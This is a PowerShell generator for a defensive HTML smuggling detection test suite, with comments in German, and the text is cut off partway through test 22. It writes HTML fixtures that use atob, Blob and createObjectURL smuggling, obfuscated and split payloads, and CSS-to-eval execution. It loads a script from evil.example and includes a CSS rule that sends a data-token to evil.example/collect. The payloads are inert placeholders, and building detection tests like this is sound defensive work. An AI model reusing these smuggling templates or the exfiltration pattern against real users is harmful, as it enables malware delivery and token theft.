# create_html_pattern_test_suite_v4_4_2_r1.ps1
# Bereinigte HTML Pattern Test Suite fuer HTML Smuggling Detection v4.4.2-r1
#
# Wichtig:
#   Diese Suite testet bewusst nur HTML und Script Muster.
#   Alles, was echte MIME Parts, echte Attachment Dateinamen, echte Header oder
#   echte Newsletter Mailheader braucht, gehoert in eine separate EML Suite.
#
# Ziel:
#   - Decode Gates sicher erfuellen
#   - schwache oder falsch gemappte Alt-Tests bereinigen
#   - fehlende positive HTML Pattern Tests ergaenzen
#   - realistische Manifest Daten mit ExpectedCoreReasons erzeugen
#
# Decode Gates aus der Lua Logik:
#   LB64.min_len = 200
#   LB64.min_decode_total = 400

param(
  [switch]$Force
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

Write-Host "╔══════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   HTML Pattern Test Suite v4.4.2-r1                                                 ║" -ForegroundColor Cyan
Write-Host "║   Fokus: HTML, Script, Decode, SVG Data URI, CSS, Geo, Evasion, ClickFix, Web3     ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

$testFolderName = 'HTML_Smuggling_HTMLPatternSuite_v4_4_2_r1'
$outputRoot = Join-Path -Path (Get-Location).Path -ChildPath $testFolderName
$utf8NoBom = [System.Text.UTF8Encoding]::new($false)

$MinDecodeBase64Chars = 400
$TargetPayloadBytes = 320

if (-not (Test-Path -LiteralPath $outputRoot)) {
  New-Item -ItemType Directory -Path $outputRoot | Out-Null
}

function Join-ByteArrays {
  param(
    [Parameter(Mandatory)]
    [byte[][]]$Arrays
  )

  $ms = New-Object System.IO.MemoryStream
  try {
    foreach ($arr in $Arrays) {
      if ($null -ne $arr -and $arr.Length -gt 0) {
        $ms.Write($arr, 0, $arr.Length)
      }
    }
    return $ms.ToArray()
  }
  finally {
    $ms.Dispose()
  }
}

function Ensure-MinimumByteLength {
  param(
    [Parameter(Mandatory)]
    [byte[]]$Bytes,

    [int]$MinimumBytes = 320,

    [byte]$PadByte = 0x41
  )

  if ($Bytes.Length -ge $MinimumBytes) {
    return $Bytes
  }

  $pad = New-Object byte[] ($MinimumBytes - $Bytes.Length)
  for ($i = 0; $i -lt $pad.Length; $i++) {
    $pad[$i] = $PadByte
  }

  return (Join-ByteArrays -Arrays @($Bytes, $pad))
}

function Convert-BytesToBase64 {
  param(
    [Parameter(Mandatory)]
    [byte[]]$Bytes,

    [int]$MinimumBytes = 320,

    [byte]$PadByte = 0x41
  )

  $normalized = Ensure-MinimumByteLength -Bytes $Bytes -MinimumBytes $MinimumBytes -PadByte $PadByte
  return [Convert]::ToBase64String($normalized)
}

function Convert-TextToBase64MinSize {
  param(
    [Parameter(Mandatory)]
    [string]$Text,

    [int]$MinimumBytes = 320,

    [string]$PadChunk = "`r`n/* PAD_FOR_HTML_SMUGGLING_TEST_SUITE_0123456789ABCDEF */"
  )

  $buffer = $Text
  while ([System.Text.Encoding]::UTF8.GetByteCount($buffer) -lt $MinimumBytes) {
    $buffer += $PadChunk
  }

  $bytes = [System.Text.Encoding]::UTF8.GetBytes($buffer)
  return [Convert]::ToBase64String($bytes)
}

function Assert-MinBase64Length {
  param(
    [Parameter(Mandatory)]
    [string]$Name,

    [Parameter(Mandatory)]
    [string]$Base64,

    [int]$MinimumChars = 400
  )

  if ($Base64.Length -lt $MinimumChars) {
    throw "$Name ist zu kurz fuer den Decode Gate. Laenge=$($Base64.Length), Minimum=$MinimumChars"
  }
}

function Write-Utf8NoBomFile {
  param(
    [Parameter(Mandatory)][string]$Path,
    [Parameter(Mandatory)][string]$Content
  )

  [System.IO.File]::WriteAllText($Path, $Content, $utf8NoBom)
}

function New-FakePEHeader {
  [byte[]]$dos = @(
    0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
    0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00
  )

  $stubLen = 0x80 - $dos.Length
  $stub = New-Object byte[] $stubLen
  for ($i = 0; $i -lt $stub.Length; $i++) {
    $stub[$i] = 0x0E
  }

  [byte[]]$pe = @(
    0x50,0x45,0x00,0x00,
    0x4C,0x01,
    0x03,0x00,
    0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,
    0xE0,0x00,
    0x02,0x01
  )

  $optional = New-Object byte[] 224
  $optional[0] = 0x0B
  $optional[1] = 0x01

  [byte[]]$full = Join-ByteArrays -Arrays @($dos, $stub, $pe, $optional)

  if ($full.Length -lt 512) {
    $padding = New-Object byte[] (512 - $full.Length)
    $full = Join-ByteArrays -Arrays @($full, $padding)
  }

  return (Convert-BytesToBase64 -Bytes $full -MinimumBytes $TargetPayloadBytes)
}

function New-FakeWASMModule {
  [byte[]]$wasm = Join-ByteArrays -Arrays @(
    [byte[]](0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00),
    [byte[]](0x01,0x04,0x01,0x60,0x00,0x00),
    [byte[]](0x03,0x02,0x01,0x00),
    [byte[]](0x07,0x08,0x01,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00),
    [byte[]](0x0A,0x04,0x01,0x02,0x00,0x0B)
  )

  return (Convert-BytesToBase64 -Bytes $wasm -MinimumBytes $TargetPayloadBytes)
}

function New-FakeZipContainer {
  [byte[]]$zip = @(
    0x50,0x4B,0x03,0x04,0x14,0x00,0x00,0x00,0x08,0x00,
    0x00,0x00,0x21,0x00,0x12,0x34,0x56,0x78,0x08,0x00,
    0x00,0x00,0x08,0x00,0x00,0x00,0x08,0x00,0x00,0x00,
    0x74,0x65,0x73,0x74,0x2E,0x74,0x78,0x74,0x54,0x45,
    0x53,0x54,0x44,0x41,0x54,0x41
  )
  return (Convert-BytesToBase64 -Bytes $zip -MinimumBytes $TargetPayloadBytes)
}

function New-FakeCHM {
  [byte[]]$chm = @(
    0x49,0x54,0x53,0x46,0x03,0x00,0x00,0x00,0x60,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0xAA,0xBB,0xCC,0xDD
  )
  return (Convert-BytesToBase64 -Bytes $chm -MinimumBytes $TargetPayloadBytes)
}

function New-FakeLNK {
  [byte[]]$lnk = @(
    0x4C,0x00,0x00,0x00,
    0x01,0x14,0x02,0x00,
    0x00,0x00,0x00,0x00,
    0xC0,0x00,0x00,0x00,
    0x00,0x00,0x00,0x46
  )
  return (Convert-BytesToBase64 -Bytes $lnk -MinimumBytes $TargetPayloadBytes)
}

function New-FakePDFWithJavaScript {
  $pdf = @"
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('Malicious PDF');) >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Hello) Tj ET
endstream
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000077 00000 n
0000000136 00000 n
0000000212 00000 n
0000000287 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
354
%%EOF
"@
  return (Convert-TextToBase64MinSize -Text $pdf -MinimumBytes $TargetPayloadBytes)
}

function New-FakePDFWithLaunch {
  $pdf = @"
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 4 0 R >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
4 0 obj
<< /Names [ (file) 5 0 R ] >>
endobj
5 0 obj
<< /Type /Filespec /F (malware.exe) /EF << /F 6 0 R >> /UF (malware.exe) >>
endobj
6 0 obj
<< /Type /EmbeddedFile /Length 16 /Params << /Size 16 >> >>
stream
MZFAKEPAYLOAD01
endstream
endobj
7 0 obj
<< /Type /Action /S /Launch /Win << /F (malware.exe) >> >>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000094 00000 n
0000000153 00000 n
0000000214 00000 n
0000000264 00000 n
0000000355 00000 n
0000000460 00000 n
trailer
<< /Size 8 /Root 1 0 R >>
startxref
525
%%EOF
"@
  return (Convert-TextToBase64MinSize -Text $pdf -MinimumBytes $TargetPayloadBytes)
}

function New-FakeCertificate {
  return @"
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKlQz7jYpU9MMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVB
AYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8GA1UE
CgwIVGVzdCBDQTAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEwMDAwMDBaMEUxCzAJ
BgNVBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8G
A1UECgwIVGVzdCBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMtC
j3lZxJzLxVvzQtq0Wq7X8j2N5P9MkQoRf2A3B4cD5E6F7G8H9I0J1K2L3M4N5O6P
-----END CERTIFICATE-----
"@
}

function New-FakePKCS7 {
  return @"
-----BEGIN PKCS7-----
MIIB1gYJKoZIhvcNAQcCoIIBxzCCAcMCAQExADALBgkqhkiG9w0BBwGgggGmMIIB
ojCCAYugAwIBAgIJAJlQz7jYpU9MMA0GCSqGSIb3DQEBCwUAMFExCzAJBgNVBAYT
AkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8GA1UECgwI
VGVzdCBDQTENMAsGA1UEAwwEdGVzdDAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEw
MDAwMDBaMFExCzAJBgNVBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcM
Bk11ZW5jaDERMA8GA1UECgwIVGVzdCBDQTENMAsGA1UEAwwEdGVzdDCBnzANBgkq
hkiG9w0BAQEFAAOBjQAwgYkCgYEAy0KPeVnEnMvFWNC2rRartfyPY3k0yRChFYYDc
HhwPkToXsHwj0jQnUrYszg0nU6P7Q8R9S0T1U2V3W4X5Y6Z7a8b9c0d1e2f3g4h5i6
j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N
-----END PKCS7-----
"@
}

function New-FakeSVG {
  param(
    [Parameter(Mandatory)][string]$EmbeddedBase64
  )

  return @"
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml" width="100" height="100" onload="console.log('svg-loaded')">
  <script type="text/javascript"><![CDATA[
    var payload = "$EmbeddedBase64";
    var decoded = atob(payload);
    var blob = new Blob([decoded], {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    window.__smuggle_url = url;
  ]]></script>
  <rect x="10" y="10" width="80" height="80" fill="red"/>
  <foreignObject x="0" y="0" width="50" height="20">
    <xhtml:div>svg smuggling</xhtml:div>
  </foreignObject>
  <image href="data:application/octet-stream;base64,$EmbeddedBase64" width="1" height="1" />
</svg>
"@
}

function New-LargeUint8ArrayLiteral {
  param(
    [int]$Count = 1100
  )

  $bytes = New-Object System.Collections.Generic.List[string]
  $seed = [byte[]](
    0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,
    0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
    0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x50,0x45,0x00,0x00
  )

  foreach ($b in $seed) {
    [void]$bytes.Add([string]$b)
  }

  $fillCount = $Count - $seed.Length
  for ($i = 0; $i -lt $fillCount; $i++) {
    [void]$bytes.Add([string](($i % 251) + 1))
  }

  return ($bytes -join ',')
}

function Add-TestFile {
  param(
    [Parameter(Mandatory)][ref]$List,
    [Parameter(Mandatory)][string]$Name,
    [Parameter(Mandatory)][string]$ExpectedScore,
    [Parameter(Mandatory)][string]$ExpectedDetection,
    [Parameter(Mandatory)][string]$ExpectedCoreReasons,
    [Parameter(Mandatory)][string]$Description,
    [Parameter(Mandatory)][string]$Category,
    [Parameter(Mandatory)][string]$Content
  )

  $List.Value += @{
    Name = $Name
    ExpectedScore = $ExpectedScore
    ExpectedDetection = $ExpectedDetection
    ExpectedCoreReasons = $ExpectedCoreReasons
    Description = $Description
    Category = $Category
    Content = $Content
  }
}

Write-Host "Generiere Payloads..." -ForegroundColor Yellow
$PE_BASE64 = New-FakePEHeader
$WASM_BASE64 = New-FakeWASMModule
$PDF_JS_BASE64 = New-FakePDFWithJavaScript
$PDF_LAUNCH_BASE64 = New-FakePDFWithLaunch
$ZIP_BASE64 = New-FakeZipContainer
$CHM_BASE64 = New-FakeCHM
$LNK_BASE64 = New-FakeLNK
$CERT_PEM = New-FakeCertificate
$CERT_PKCS7 = New-FakePKCS7
$SVG_CONTENT = New-FakeSVG -EmbeddedBase64 $PE_BASE64
$SVG_BASE64 = Convert-TextToBase64MinSize -Text $SVG_CONTENT -MinimumBytes $TargetPayloadBytes
$HTA_BASE64 = Convert-TextToBase64MinSize -Text '<HTA:APPLICATION><script>alert("xs")</script>' -MinimumBytes $TargetPayloadBytes
$UINT8ARRAY_LITERAL = New-LargeUint8ArrayLiteral -Count 1100
$certPemB64 = Convert-TextToBase64MinSize -Text $CERT_PEM -MinimumBytes $TargetPayloadBytes
$certPkcs7B64 = Convert-TextToBase64MinSize -Text $CERT_PKCS7 -MinimumBytes $TargetPayloadBytes

Assert-MinBase64Length -Name 'PE_BASE64' -Base64 $PE_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'WASM_BASE64' -Base64 $WASM_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'PDF_JS_BASE64' -Base64 $PDF_JS_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'PDF_LAUNCH_BASE64' -Base64 $PDF_LAUNCH_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_BASE64' -Base64 $ZIP_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'CHM_BASE64' -Base64 $CHM_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'LNK_BASE64' -Base64 $LNK_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'SVG_BASE64' -Base64 $SVG_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'HTA_BASE64' -Base64 $HTA_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'certPemB64' -Base64 $certPemB64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'certPkcs7B64' -Base64 $certPkcs7B64 -MinimumChars $MinDecodeBase64Chars

Write-Host "PE Payload: $($PE_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "WASM Payload: $($WASM_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "PDF JS Payload: $($PDF_JS_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "PDF Launch Payload: $($PDF_LAUNCH_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "ZIP Payload: $($ZIP_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "CHM Payload: $($CHM_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "LNK Payload: $($LNK_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "SVG Payload: $($SVG_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "HTA Payload: $($HTA_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "CERT PEM Payload: $($certPemB64.Length) Zeichen" -ForegroundColor Gray
Write-Host "CERT PKCS7 Payload: $($certPkcs7B64.Length) Zeichen" -ForegroundColor Gray
Write-Host ""

$testFiles = @()

# 01
Add-TestFile -List ([ref]$testFiles) -Name 'test01_basic_pe_smuggling.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob,blob,createObjectURL,dec_pe' -Description 'Basis: atob plus Blob plus createObjectURL plus PE' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var payload = "$PE_BASE64";
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__smuggle_url = url;
</script>
</body></html>
"@

# 02
Add-TestFile -List ([ref]$testFiles) -Name 'test02_split_payload_pe_fixed.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'split_payload,atob,blob,createObjectURL,dec_pe' -Description 'Korrigierter Split Payload mit mindestens sechs Fragmenten' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var p1 = "$($PE_BASE64.Substring(0,120))";
var p2 = "$($PE_BASE64.Substring(120,120))";
var p3 = "$($PE_BASE64.Substring(240,120))";
var p4 = "$($PE_BASE64.Substring(360,120))";
var p5 = "$($PE_BASE64.Substring(480,80))";
var p6 = "$($PE_BASE64.Substring(560))";
var payload = "";
payload += p1;
payload += p2;
payload += p3;
payload += p4;
payload += p5;
payload += p6;
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__split_url = url;
</script>
</body></html>
"@

# 03
Add-TestFile -List ([ref]$testFiles) -Name 'test03_array_join_pe.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob,blob,createObjectURL,b64_joined_parts,dec_pe' -Description 'Array.join Konstruktion mit PE Payload' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var parts = [
  "$($PE_BASE64.Substring(0,200))",
  "$($PE_BASE64.Substring(200,200))",
  "$($PE_BASE64.Substring(400))"
];
var payload = parts.join('');
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__joined_url = url;
</script>
</body></html>
"@

# 04
Add-TestFile -List ([ref]$testFiles) -Name 'test04_obfuscated_pe.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob_obfuscated or obfus_api,blob,createObjectURL,dec_pe' -Description 'Obfuskierter Zugriff ueber Array Indizes und Konstruktoren' -Category 'OBFUSCATION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var _0x4a8b = ['atob', 'Blob', 'createObjectURL', 'href'];
var _0x2c9d = "$PE_BASE64";
var _0x1f3e = window[_0x4a8b[0]](_0x2c9d);
var _0x5b2a = new window[_0x4a8b[1]]([_0x1f3e], {type:'application/octet-stream'});
var _0x7d4c = URL[_0x4a8b[2]](_0x5b2a);
window.location[_0x4a8b[3]] = _0x7d4c;
</script>
</body></html>
"@

# 05
Add-TestFile -List ([ref]$testFiles) -Name 'test05_wasm_smuggling.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'fetch,webassembly or wasm_fetch_stage' -Description 'WASM Modul ueber fetch und WebAssembly.instantiate' -Category 'WASM_STAGING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var wasmData = "$WASM_BASE64";
var decoded = atob(wasmData);
var blob = new Blob([decoded], {type: 'application/wasm'});
var url = URL.createObjectURL(blob);
fetch(url).then(function(r) { return r.arrayBuffer(); }).then(function(bytes) {
  return WebAssembly.instantiate(bytes);
});
</script>
</body></html>
"@

# 06
Add-TestFile -List ([ref]$testFiles) -Name 'test06_uint8array_pe_large.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'uint8array_payload,pe_uint8array' -Description 'Korrigierter Uint8Array Test mit mehr als 1024 Bytewerten' -Category 'UINT8ARRAY' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var peBytes = new Uint8Array([$UINT8ARRAY_LITERAL]);
var blob = new Blob([peBytes], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__uint8_url = url;
</script>
</body></html>
"@

# 07
Add-TestFile -List ([ref]$testFiles) -Name 'test07_delayed_execution_pe.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'delayed_execution,timeout_b64_smuggling or timeout_b64_decode,dec_pe' -Description 'Verzoegertes Smuggling ueber setTimeout' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
setTimeout(function() {
  var payload = "$PE_BASE64";
  var decoded = atob(payload);
  var blob = new Blob([decoded], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  window.__delayed_url = url;
}, 150);
</script>
</body></html>
"@

# 08
Add-TestFile -List ([ref]$testFiles) -Name 'test08_webworker_pe.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'webworker,atob,blob,createObjectURL,dec_pe' -Description 'Web Worker verarbeitet den Base64 Payload' -Category 'WEBWORKER' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var workerCode = "self.onmessage = function(e){ var decoded = atob(e.data.payload); self.postMessage(decoded); }";
var workerBlob = new Blob([workerCode], {type: 'application/javascript'});
var workerUrl = URL.createObjectURL(workerBlob);
var worker = new Worker(workerUrl);
worker.onmessage = function(e) {
  var blob = new Blob([e.data], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  window.__worker_url = url;
};
worker.postMessage({payload: "$PE_BASE64"});
</script>
</body></html>
"@

# 09
Add-TestFile -List ([ref]$testFiles) -Name 'test09_fetch_api_pe.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'fetch,data_uri or blob,createObjectURL or dec_pe' -Description 'Fetch API plus Data URI Transport' -Category 'FETCH' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var payload = "$PE_BASE64";
fetch('data:application/octet-stream;base64,' + payload)
  .then(function(r) { return r.blob(); })
  .then(function(b) {
    var url = URL.createObjectURL(b);
    window.__fetch_url = url;
  });
</script>
</body></html>
"@

# 10
Add-TestFile -List ([ref]$testFiles) -Name 'test10_appinstaller_schema.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'ms_appinstaller_uri or ms_appinstaller_word' -Description 'AppInstaller Schema und XML Kontext' -Category 'APPINSTALLER' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var schema = "ms-appinstaller:?source=https://example.com/malware.appinstaller";
var xml = '<?xml version="1.0"?><AppInstaller Uri="https://example.com/app.msix" Version="1.0.0.0"><MainPackage Name="App" Publisher="CN=Test" Version="1.0.0.0" Uri="https://example.com/app.msix"/></AppInstaller>';
var blob = new Blob([xml], {type: 'application/xml'});
var url = URL.createObjectURL(blob);
console.log(schema, url);
</script>
</body></html>
"@

# 11
Add-TestFile -List ([ref]$testFiles) -Name 'test11_pdf_javascript_payload.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_pdf,att_pdf_javascript' -Description 'PDF mit JavaScript Action im Decode Pfad' -Category 'PDF_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var pdfData = "$PDF_JS_BASE64";
var decoded = atob(pdfData);
var blob = new Blob([decoded], {type: 'application/pdf'});
var url = URL.createObjectURL(blob);
window.__pdf_js = url;
</script>
</body></html>
"@

# 12
Add-TestFile -List ([ref]$testFiles) -Name 'test12_pdf_launch_payload.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_pdf,att_pdf_launch,att_pdf_embeddedfile' -Description 'PDF mit Launch und EmbeddedFile im Decode Pfad' -Category 'PDF_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var pdfData = "$PDF_LAUNCH_BASE64";
var decoded = atob(pdfData);
var blob = new Blob([decoded], {type: 'application/pdf'});
var url = URL.createObjectURL(blob);
window.__pdf_launch = url;
</script>
</body></html>
"@

# 13
Add-TestFile -List ([ref]$testFiles) -Name 'test13_svg_active_content.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_svg_script,att_svg_event_handler,att_svg_foreignobject,att_svg_data_uri,att_svg_smuggling_context' -Description 'Aktives SVG in eingebetteter object data URI Form' -Category 'SVG_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<object data="data:image/svg+xml;base64,$SVG_BASE64" type="image/svg+xml"></object>
</body></html>
"@

# 14
Add-TestFile -List ([ref]$testFiles) -Name 'test14_chm_payload.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_chm_attachment or CHM decode indicator' -Description 'CHM Payload ueber Base64 und Blob' -Category 'ATTACHMENT_VECTOR_DECODE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var chmData = "$CHM_BASE64";
var decoded = atob(chmData);
var blob = new Blob([decoded], {type: 'application/vnd.ms-htmlhelp'});
var url = URL.createObjectURL(blob);
window.__chm_url = url;
</script>
</body></html>
"@

# 15
Add-TestFile -List ([ref]$testFiles) -Name 'test15_hta_payload.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_hta_attachment or dec_script' -Description 'HTA Payload ueber Base64 und Blob' -Category 'ATTACHMENT_VECTOR_DECODE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var htaData = "$HTA_BASE64";
var decoded = atob(htaData);
var blob = new Blob([decoded], {type: 'application/hta'});
var url = URL.createObjectURL(blob);
window.__hta_url = url;
</script>
</body></html>
"@

# 16
Add-TestFile -List ([ref]$testFiles) -Name 'test16_certificate_inline_pem.html' -ExpectedScore '2-5' -ExpectedDetection 'YES' -ExpectedCoreReasons 'cert_attachment_file or cert_base64_block' -Description 'Inline PEM Zertifikat ohne starken Smuggling Kontext' -Category 'CERT_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PEM
</pre>
</body></html>
"@

# 17
Add-TestFile -List ([ref]$testFiles) -Name 'test17_certificate_pkcs7_inline.html' -ExpectedScore '2-5' -ExpectedDetection 'YES' -ExpectedCoreReasons 'cert_attachment_file or cert_base64_block' -Description 'Inline PKCS7 Block ohne starken Smuggling Kontext' -Category 'CERT_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PKCS7
</pre>
</body></html>
"@

# 18
Add-TestFile -List ([ref]$testFiles) -Name 'test18_certificate_smuggling_context.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'cert_inline_pem or cert_base64_block plus Smuggling Kontext' -Description 'Zertifikatsblock zusammen mit Smuggling Kontext' -Category 'CERT_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PEM
</pre>
<script>
var payload = "$PE_BASE64";
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
console.log(url);
</script>
</body></html>
"@

# 19
Add-TestFile -List ([ref]$testFiles) -Name 'test19_css_code_execution.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_before_after_content,css_hidden_code_string,css_function_bridge,css_code_execution' -Description 'CSS Inhalte werden spaeter als Code missbraucht' -Category 'CSS_CODE_EXEC' -Content @"
<!DOCTYPE html>
<html><head>
<style>
body::before {
  content: "atob('cGF5bG9hZA==')";
}
body::after {
  content: "eval(atob('dGVzdA=='))";
}
</style>
</head>
<body>
<script>
var style = getComputedStyle(document.body, '::before');
var content = style.content;
if (content && content.indexOf('atob') !== -1) {
  eval(content);
}
</script>
</body></html>
"@

# 20
Add-TestFile -List ([ref]$testFiles) -Name 'test20_css_computedstyle_exec.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_computedstyle_exec,css_function_bridge' -Description 'getComputedStyle liest versteckten Inhalt aus' -Category 'CSS_CODE_EXEC' -Content @"
<!DOCTYPE html>
<html><head>
<style>
#test::before { content: "YWxlcnQoJ3h4eCcp"; }
</style>
</head>
<body>
<div id="test"></div>
<script>
var before = getComputedStyle(document.getElementById('test'), '::before').content;
var decoded = atob(before.replace(/['"]/g, ''));
eval(decoded);
</script>
</body></html>
"@

# 21
Add-TestFile -List ([ref]$testFiles) -Name 'test21_external_scripts_positive.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob,external_scripts' -Description 'Externes Script im vorhandenen Smuggling Kontext' -Category 'EXTERNAL_SCRIPTS' -Content @"
<!DOCTYPE html>
<html><body>
<script src="https://evil.example/payload.js"></script>
<script>
var seed = atob("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=");
console.log(seed);
</script>
</body></html>
"@

# 22
Add-TestFile -List ([ref]$testFiles) -Name 'test22_css_exfil_attr.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_attr_exfil,css_exfiltration' -Description 'CSS attr Exfiltration ueber background url' -Category 'CSS_EXFIL' -Content @"
<!DOCTYPE html>
<html><head>
<style>
input[data-token] {
  background-image: url(https://evil.example/collect?d=attr(data-token));
}
</style>
</head>
<body>
